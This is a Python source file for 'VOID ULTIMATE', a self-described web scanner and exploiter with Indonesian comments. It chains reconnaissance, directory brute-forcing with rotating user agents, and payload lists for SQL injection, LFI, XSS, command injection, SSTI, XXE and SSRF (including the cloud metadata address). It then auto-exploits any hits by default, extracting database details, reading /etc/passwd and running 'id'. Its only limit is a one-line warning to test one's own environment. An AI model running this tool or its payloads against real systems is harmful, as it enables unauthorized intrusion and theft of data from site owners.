#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║  VOID ULTIMATE v1.0 - Advanced Web Security Scanner & Exploiter  ║
║  All-in-One: Recon, Scanning, Exploitation, Reporting            ║
║  Usage: python void_ultimate.py <target> [options]              ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import time
import json
import socket
import random
import hashlib
import threading
import subprocess
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    # Fallback jika colorama tidak ada
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
        LIGHTRED = '\033[91m'; LIGHTGREEN = '\033[92m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; RESET_ALL = '\033[0m'
    class Back:
        RED = '\033[41m'; GREEN = '\033[42m'; YELLOW = '\033[43m'; RESET = '\033[49m'

# ============================================================
# KONFIGURASI GLOBAL
# ============================================================
CONFIG = {
    'timeout': 10,
    'max_threads': 50,
    'max_depth': 3,
    'delay_min': 0.1,
    'delay_max': 0.5,
    'user_agents': [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1"
    ],
    'wordlist': {
        'directories': [
            "admin", "login", "uploads", "backup", "tmp", "logs", "phpmyadmin",
            "wp-admin", "wp-content", "api", "css", "js", "images", "files",
            "download", "data", "config", "includes", "modules", "plugins",
            "themes", "vendor", "src", "app", "system", "core", "lib", "inc",
            "old", "new", "test", "dev", "stage", "prod", "private", "public",
            "static", "assets", "media", "resources", "documents", "archive"
        ],
        'files': [
            "index.php", "index.html", "index.asp", "index.jsp", "index.cfm",
            "default.php", "default.html", "default.asp", "main.php",
            "config.php", "config.inc.php", "wp-config.php", "settings.php",
            ".env", ".git/config", ".htaccess", "robots.txt", "sitemap.xml",
            "phpinfo.php", "info.php", "test.php", "backup.sql", "dump.sql",
            "README.md", "LICENSE", "CHANGELOG", "composer.json", "package.json"
        ],
        'extensions': ['.php', '.html', '.htm', '.asp', '.aspx', '.jsp', '.jspx', '.cfm', '.do', '.action', '.txt', '.xml', '.json']
    },
    'payloads': {
        'sqli': [
            "'", "\"", "' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--",
            "' AND SLEEP(3)--", "' AND 1=1--", "' AND 1=2--", "' OR '1'='1'/*",
            "' OR 1=1--", "'; DROP TABLE users--", "' UNION SELECT 1,2,3,4,5--",
            "' AND 1=CONVERT(int, @@version)--", "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
        ],
        'lfi': [
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "/etc/passwd", "C:\\windows\\win.ini",
            "../../../../../../etc/passwd", "../../../../../../etc/shadow",
            "../../../etc/hosts", "file:///etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd"
        ],
        'xss': [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
            "\"><script>alert('XSS')</script>", "';alert('XSS');//",
            "<svg/onload=alert(1)>", "javascript:alert('XSS')",
            "<iframe src=javascript:alert(1)>", "<body onload=alert('XSS')>"
        ],
        'cmd': [
            "; id", "| id", "& id", "&& whoami", "|| whoami",
            "; ping -c 1 127.0.0.1", "| echo RCE", "& echo RCE",
            "; systeminfo", "| whoami", "& dir", "|| ls"
        ],
        'ssti': [
            "{{7*7}}", "${7*7}", "{{config}}", "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}", "{{7*'7'}}",
            "{{7*7}}", "${{7*7}}", "*{7*7}"
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:80/test">]><root>&test;</root>'
        ],
        'ssrf': [
            "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:80",
            "file:///etc/passwd", "gopher://127.0.0.1:80/_GET / HTTP/1.0"
        ],
        'open_redirect': [
            "//google.com", "https://google.com", "/%2F/google.com", "http://google.com"
        ],
        'file_upload': {
            'php': '<?php echo "UPLOAD_TEST"; ?>',
            'asp': '<% Response.Write("UPLOAD_TEST") %>',
            'jsp': '<% out.println("UPLOAD_TEST"); %>'
        }
    },
    'headers': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
}

# ============================================================
# KELAS UTAMA: VOID Scanner
# ============================================================
class VOIDScanner:
    def __init__(self, target, options):
        self.target = target
        self.options = options
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = CONFIG['timeout']
        self.base_url = self._normalize_url(target)
        self.parsed = urlparse(self.base_url)
        self.host = self.parsed.netloc
        self.scheme = self.parsed.scheme
        self.ip = None
        self.results = {
            'target': self.base_url,
            'timestamp': datetime.now().isoformat(),
            'recon': {},
            'directories': [],
            'parameters': {},
            'vulnerabilities': [],
            'exploits': [],
            'summary': {}
        }
        self.lock = threading.Lock()
        self.progress = 0
        self.total_tasks = 0

    def _normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def _get_headers(self):
        headers = CONFIG['headers'].copy()
        headers['User-Agent'] = random.choice(CONFIG['user_agents'])
        return headers

    def _request(self, url, method='GET', params=None, data=None, headers=None, allow_redirects=True):
        try:
            h = self._get_headers()
            if headers:
                h.update(headers)
            if method.upper() == 'GET':
                return self.session.get(url, params=params, headers=h, timeout=CONFIG['timeout'], allow_redirects=allow_redirects)
            elif method.upper() == 'POST':
                return self.session.post(url, data=data, headers=h, timeout=CONFIG['timeout'])
            else:
                return None
        except Exception as e:
            return None

    def _safe_join(self, base, path):
        return urljoin(base, path)

    def _print(self, msg, color=Fore.WHITE, symbol='*'):
        print(f"{color}[{symbol}] {msg}{Fore.RESET}")

    def _print_success(self, msg):
        self._print(msg, Fore.GREEN, '+')

    def _print_error(self, msg):
        self._print(msg, Fore.RED, '!')

    def _print_warning(self, msg):
        self._print(msg, Fore.YELLOW, '?')

    def _print_info(self, msg):
        self._print(msg, Fore.CYAN, 'i')

    def _print_debug(self, msg):
        if self.options.get('debug'):
            self._print(msg, Fore.MAGENTA, 'd')

    # ============================================================
    # MODUL 1: RECONNAISSANCE
    # ============================================================
    def run_recon(self):
        self._print_info("Starting Reconnaissance...")
        recon = {}
        
        # IP Address
        try:
            self.ip = socket.gethostbyname(self.host.split(':')[0])
            recon['ip'] = self.ip
            self._print_success(f"IP Address: {self.ip}")
        except:
            recon['ip'] = 'Unknown'
            self._print_error("Failed to resolve IP")

        # WHOIS (sederhana)
        try:
            import whois
            w = whois.whois(self.host)
            recon['whois'] = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date)
            }
            self._print_success(f"WHOIS: {w.registrar}")
        except:
            recon['whois'] = 'Not available'

        # HTTP Headers
        try:
            r = self._request(self.base_url, method='HEAD')
            if r:
                headers = dict(r.headers)
                recon['headers'] = headers
                self._print_success(f"Server: {headers.get('Server', 'Unknown')}")
                self._print_success(f"X-Powered-By: {headers.get('X-Powered-By', 'Unknown')}")
                
                # Deteksi framework
                tech = self._detect_technology(r.text if r.text else '')
                recon['technologies'] = tech
                if tech:
                    self._print_success(f"Technologies: {', '.join(tech)}")
        except:
            recon['headers'] = 'Failed to retrieve'

        # Port Scanning dasar (common ports)
        ports = [80, 443, 21, 22, 25, 53, 110, 143, 993, 995, 8080, 8443]
        open_ports = []
        self._print_info("Scanning common ports...")
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((self.ip, port))
                if result == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        recon['open_ports'] = open_ports
        if open_ports:
            self._print_success(f"Open ports: {', '.join(map(str, open_ports))}")

        # DNS Records (dig style)
        try:
            import dns.resolver
            records = {}
            for record_type in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(self.host, record_type)
                    records[record_type] = [str(r) for r in answers]
                except:
                    pass
            recon['dns'] = records
        except:
            recon['dns'] = 'Not available'

        self.results['recon'] = recon
        return recon

    def _detect_technology(self, text):
        tech = []
        indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Joomla': ['joomla', 'com_content', 'com_users'],
            'Drupal': ['drupal', 'sites/default/files'],
            'Laravel': ['laravel', 'csrf-token'],
            'Symfony': ['symfony', 'app_dev.php'],
            'CodeIgniter': ['codeigniter', 'CI_VERSION'],
            'Angular': ['ng-app', 'angular'],
            'React': ['react', 'data-reactid'],
            'Vue.js': ['vue', 'v-bind'],
            'Bootstrap': ['bootstrap', 'container-fluid'],
            'jQuery': ['jquery', '$.']
        }
        for tech_name, patterns in indicators.items():
            for p in patterns:
                if p.lower() in text.lower():
                    tech.append(tech_name)
                    break
        return tech

    # ============================================================
    # MODUL 2: DIRECTORY & FILE SCANNING
    # ============================================================
    def scan_directories(self):
        self._print_info("Starting Directory & File Scanning...")
        found = []
        wordlist = CONFIG['wordlist']['directories'] + CONFIG['wordlist']['files']
        
        with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
            futures = {}
            for item in wordlist:
                url = self._safe_join(self.base_url, item)
                futures[executor.submit(self._check_path, url)] = item
            
            for future in as_completed(futures):
                item = futures[future]
                try:
                    result = future.result()
                    if result:
                        found.append(result)
                        self._print_success(f"Found: {result['url']} ({result['status']})")
                except:
                    pass
        self.results['directories'] = found
        return found

    def _check_path(self, url):
        r = self._request(url)
        if r:
            if r.status_code in [200, 204, 301, 302, 403]:
                return {
                    'url': url,
                    'status': r.status_code,
                    'content_type': r.headers.get('Content-Type', '')
                }
        return None

    # ============================================================
    # MODUL 3: PARAMETER DISCOVERY
    # ============================================================
    def discover_parameters(self):
        self._print_info("Discovering parameters...")
        params = {'get': set(), 'post': set(), 'cookie': set()}
        
        # From HTML forms dan links
        try:
            r = self._request(self.base_url)
            if r:
                # GET parameters from links
                matches = re.findall(r'\?([^"\'\s&]+)=', r.text)
                for m in matches:
                    params['get'].add(m)
                # POST forms
                forms = re.findall(r'<form[^>]*method=["\'](post|POST)["\'][^>]*>', r.text)
                if forms:
                    params['post'].add('standard_form')
                # Hidden inputs
                hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']', r.text)
                for h in hidden:
                    params['post'].add(h)
        except:
            pass

        # Common parameters
        common = ['id', 'page', 'file', 'dir', 'path', 'q', 's', 'search', 'query', 'cat', 'category', 'product', 'view', 'action', 'cmd', 'exec', 'system']
        for c in common:
            params['get'].add(c)

        self.results['parameters'] = params
        self._print_success(f"Found parameters: GET({len(params['get'])}) POST({len(params['post'])})")
        return params

    # ============================================================
    # MODUL 4: VULNERABILITY SCANNING
    # ============================================================
    def scan_vulnerabilities(self):
        self._print_info("Scanning for vulnerabilities...")
        vulns = []
        params = self.results['parameters']['get'].union(self.results['parameters']['post'])
        
        if not params:
            params = ['id', 'page', 'file', 'q', 's', 'cmd']

        # SQL Injection
        self._print_info("Testing SQL Injection...")
        for param in params:
            for payload in CONFIG['payloads']['sqli']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url)
                if r:
                    if self._is_sqli_responsive(r):
                        vuln = {
                            'type': 'SQL Injection',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Error message or time delay'
                        }
                        vulns.append(vuln)
                        self._print_success(f"SQLi found: {param} with {payload}")
                        break

        # LFI
        self._print_info("Testing LFI...")
        for param in params:
            for payload in CONFIG['payloads']['lfi']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url)
                if r:
                    if 'root:' in r.text or '[extensions]' in r.text or 'Administrator' in r.text:
                        vuln = {
                            'type': 'LFI',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'File content detected'
                        }
                        vulns.append(vuln)
                        self._print_success(f"LFI found: {param} with {payload}")
                        break

        # XSS
        self._print_info("Testing XSS...")
        for param in params:
            for payload in CONFIG['payloads']['xss']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url)
                if r:
                    if self._is_xss_responsive(r, payload):
                        vuln = {
                            'type': 'XSS',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Payload reflected'
                        }
                        vulns.append(vuln)
                        self._print_success(f"XSS found: {param} with {payload}")
                        break

        # Command Injection
        self._print_info("Testing Command Injection...")
        for param in params:
            for payload in CONFIG['payloads']['cmd']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url)
                if r:
                    if self._is_cmd_responsive(r):
                        vuln = {
                            'type': 'Command Injection',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Command output detected'
                        }
                        vulns.append(vuln)
                        self._print_success(f"Command Injection found: {param} with {payload}")
                        break

        # SSTI
        self._print_info("Testing SSTI...")
        for param in params:
            for payload in CONFIG['payloads']['ssti']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url)
                if r:
                    if '49' in r.text or '7*7' in r.text or 'config' in r.text:
                        vuln = {
                            'type': 'SSTI',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Template evaluation'
                        }
                        vulns.append(vuln)
                        self._print_success(f"SSTI found: {param} with {payload}")
                        break

        # Open Redirect
        self._print_info("Testing Open Redirect...")
        for param in params:
            for payload in CONFIG['payloads']['open_redirect']:
                url = self._build_url_with_param(param, payload)
                r = self._request(url, allow_redirects=False)
                if r and r.status_code in [301, 302]:
                    if 'google.com' in r.headers.get('Location', ''):
                        vuln = {
                            'type': 'Open Redirect',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Redirect to external'
                        }
                        vulns.append(vuln)
                        self._print_success(f"Open Redirect found: {param} with {payload}")
                        break

        self.results['vulnerabilities'] = vulns
        return vulns

    def _build_url_with_param(self, param, value):
        if '?' in self.base_url:
            return f"{self.base_url}&{param}={quote(value)}"
        else:
            return f"{self.base_url}?{param}={quote(value)}"

    def _is_sqli_responsive(self, response):
        indicators = ['SQL', 'mysql', 'syntax', 'ORA-', 'PostgreSQL', 'Microsoft OLE DB', 'SQLite', 'You have an error in your SQL syntax', 'Unclosed quotation mark', 'Warning: mysql_fetch']
        for ind in indicators:
            if ind.lower() in response.text.lower():
                return True
        return False

    def _is_xss_responsive(self, response, payload):
        if payload.replace('<', '&lt;') not in response.text:
            if '<script>' in response.text or 'alert' in response.text or 'onerror' in response.text:
                return True
        return False

    def _is_cmd_responsive(self, response):
        indicators = ['uid=', 'gid=', 'username', 'root', 'Administrator', 'RCE', 'whoami', 'systeminfo']
        for ind in indicators:
            if ind.lower() in response.text.lower():
                return True
        return False

    # ============================================================
    # MODUL 5: EXPLOITATION (Auto-exploit if possible)
    # ============================================================
    def run_exploit(self):
        self._print_info("Attempting auto-exploitation...")
        exploits = []
        
        # For each vulnerability, try to exploit
        for vuln in self.results['vulnerabilities']:
            vuln_type = vuln['type']
            if vuln_type == 'SQL Injection':
                # Try to extract database name
                payload = "' UNION SELECT database(),user(),version()--"
                url = self._build_url_with_param(vuln['param'], payload)
                r = self._request(url)
                if r and len(r.text) > 10:
                    exploit = {
                        'type': 'SQLi Extraction',
                        'url': url,
                        'result': r.text[:500]
                    }
                    exploits.append(exploit)
                    self._print_success(f"SQLi exploited: data extracted")
            
            elif vuln_type == 'LFI':
                # Try to read /etc/passwd
                payload = "../../../../../../etc/passwd"
                url = self._build_url_with_param(vuln['param'], payload)
                r = self._request(url)
                if r and 'root' in r.text:
                    exploit = {
                        'type': 'LFI Read',
                        'url': url,
                        'result': r.text[:500]
                    }
                    exploits.append(exploit)
                    self._print_success(f"LFI exploited: /etc/passwd read")
            
            elif vuln_type == 'Command Injection':
                # Try to run id
                payload = "; id"
                url = self._build_url_with_param(vuln['param'], payload)
                r = self._request(url)
                if r and 'uid=' in r.text:
                    exploit = {
                        'type': 'Command Execution',
                        'url': url,
                        'result': r.text[:500]
                    }
                    exploits.append(exploit)
                    self._print_success(f"Command Injection exploited: id executed")

        self.results['exploits'] = exploits
        return exploits

    # ============================================================
    # MODUL 6: REPORT GENERATION
    # ============================================================
    def generate_report(self):
        self._print_info("Generating report...")
        
        # Summary
        summary = {
            'total_vulnerabilities': len(self.results['vulnerabilities']),
            'total_exploits': len(self.results['exploits']),
            'directories_found': len(self.results['directories']),
            'parameters_found': len(self.results['parameters']['get']) + len(self.results['parameters']['post'])
        }
        self.results['summary'] = summary

        # TXT Report
        txt_report = self._generate_txt()
        # JSON Report
        json_report = json.dumps(self.results, indent=2)

        # Save to files
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        txt_filename = f"scan_{self.host}_{timestamp}.txt"
        json_filename = f"scan_{self.host}_{timestamp}.json"
        html_filename = f"scan_{self.host}_{timestamp}.html"

        with open(txt_filename, 'w') as f:
            f.write(txt_report)
        
        with open(json_filename, 'w') as f:
            f.write(json_report)

        # HTML Report
        html_report = self._generate_html()
        with open(html_filename, 'w') as f:
            f.write(html_report)

        self._print_success(f"Reports saved: {txt_filename}, {json_filename}, {html_filename}")
        self._print_info(f"Summary: {summary['total_vulnerabilities']} vulnerabilities found.")
        return self.results

    def _generate_txt(self):
        report = []
        report.append("=" * 80)
        report.append(f"VOID SCAN REPORT - {self.base_url}")
        report.append(f"Date: {self.results['timestamp']}")
        report.append("=" * 80)

        report.append("\n[RECONNAISSANCE]")
        for key, val in self.results['recon'].items():
            report.append(f"  {key}: {val}")

        report.append("\n[DIRECTORIES FOUND]")
        for d in self.results['directories']:
            report.append(f"  {d['url']} ({d['status']})")

        report.append("\n[PARAMETERS]")
        for method, params in self.results['parameters'].items():
            report.append(f"  {method}: {', '.join(params) if params else 'None'}")

        report.append("\n[VULNERABILITIES]")
        if self.results['vulnerabilities']:
            for v in self.results['vulnerabilities']:
                report.append(f"  {v['type']}: {v['url']}")
                report.append(f"    Payload: {v['payload']}")
                report.append(f"    Evidence: {v['evidence']}")
        else:
            report.append("  No vulnerabilities found.")

        report.append("\n[EXPLOITS]")
        if self.results['exploits']:
            for e in self.results['exploits']:
                report.append(f"  {e['type']}: {e['url']}")
                report.append(f"    Result: {e['result'][:200]}...")
        else:
            report.append("  No exploits executed.")

        report.append("\n[SUMMARY]")
        for key, val in self.results['summary'].items():
            report.append(f"  {key}: {val}")

        return "\n".join(report)

    def _generate_html(self):
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>VOID Scan Report - {self.host}</title>
    <style>
        body {{ font-family: monospace; background: #0b0e14; color: #c8d0dc; padding: 20px; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #ff6b6b; }}
        .section {{ background: #141a22; border: 1px solid #2a3340; padding: 15px; margin: 10px 0; border-radius: 8px; }}
        .vuln {{ border-left: 3px solid #e74c3c; padding-left: 10px; margin: 5px 0; }}
        .exploit {{ border-left: 3px solid #2ecc71; padding-left: 10px; margin: 5px 0; }}
        .green {{ color: #2ecc71; }}
        .red {{ color: #e74c3c; }}
        .yellow {{ color: #f1c40f; }}
        .cyan {{ color: #6fc1ff; }}
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ VOID SCAN REPORT</h1>
    <p><strong>Target:</strong> {self.base_url}</p>
    <p><strong>Date:</strong> {self.results['timestamp']}</p>

    <div class="section">
        <h2>Reconnaissance</h2>
        <pre>{json.dumps(self.results['recon'], indent=2)}</pre>
    </div>

    <div class="section">
        <h2>Directories Found ({len(self.results['directories'])})</h2>
        <ul>
        {''.join([f"<li>{d['url']} ({d['status']})</li>" for d in self.results['directories']])}
        </ul>
    </div>

    <div class="section">
        <h2>Vulnerabilities ({len(self.results['vulnerabilities'])})</h2>
        {''.join([f"<div class='vuln'><strong>{v['type']}</strong><br>{v['url']}<br><span class='yellow'>Payload: {v['payload']}</span></div>" for v in self.results['vulnerabilities']])}
    </div>

    <div class="section">
        <h2>Exploits ({len(self.results['exploits'])})</h2>
        {''.join([f"<div class='exploit'><strong>{e['type']}</strong><br>{e['url']}<br><pre>{e['result'][:300]}...</pre></div>" for e in self.results['exploits']])}
    </div>

    <div class="section">
        <h2>Summary</h2>
        <ul>
        {''.join([f"<li>{k}: {v}</li>" for k, v in self.results['summary'].items()])}
        </ul>
    </div>

    <p style="color:#3e5367;">Generated by VOID ULTIMATE Scanner</p>
</div>
</body>
</html>
"""
        return html

    # ============================================================
    # RUN ALL
    # ============================================================
    def run(self):
        self._print_info(f"Target: {self.base_url}")
        
        # Step 1: Recon
        self.run_recon()
        
        # Step 2: Directory scan
        self.scan_directories()
        
        # Step 3: Parameter discovery
        self.discover_parameters()
        
        # Step 4: Vulnerability scan
        self.scan_vulnerabilities()
        
        # Step 5: Exploitation
        if self.options.get('exploit', True):
            self.run_exploit()
        
        # Step 6: Report
        self.generate_report()
        
        self._print_success("Scan completed successfully!")

# ============================================================
# MAIN
# ============================================================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='VOID ULTIMATE - Advanced Web Security Scanner')
    parser.add_argument('target', nargs='?', help='Target URL or IP (e.g., example.com)')
    parser.add_argument('--no-exploit', action='store_true', help='Disable auto-exploitation')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    parser.add_argument('--threads', type=int, default=30, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    
    args = parser.parse_args()
    
    # Banner
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════════╗
║  VOID ULTIMATE v1.0 - Advanced Web Security Scanner & Exploiter  ║
║  All-in-One: Recon, Scanning, Exploitation, Reporting            ║
╚═══════════════════════════════════════════════════════════════════╝
    """ + Fore.RESET)
    
    print(Fore.YELLOW + "[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI" + Fore.RESET)
    
    if not args.target:
        args.target = input(Fore.CYAN + "[?] Masukkan target (domain/IP): " + Fore.RESET).strip()
        if not args.target:
            print(Fore.RED + "[!] Target tidak boleh kosong." + Fore.RESET)
            sys.exit(1)
    
    options = {
        'exploit': not args.no_exploit,
        'debug': args.debug,
        'threads': args.threads,
        'timeout': args.timeout
    }
    
    CONFIG['max_threads'] = args.threads
    CONFIG['timeout'] = args.timeout
    
    scanner = VOIDScanner(args.target, options)
    try:
        scanner.run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user." + Fore.RESET)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}" + Fore.RESET)
        sys.exit(1)

if __name__ == "__main__":
    main()
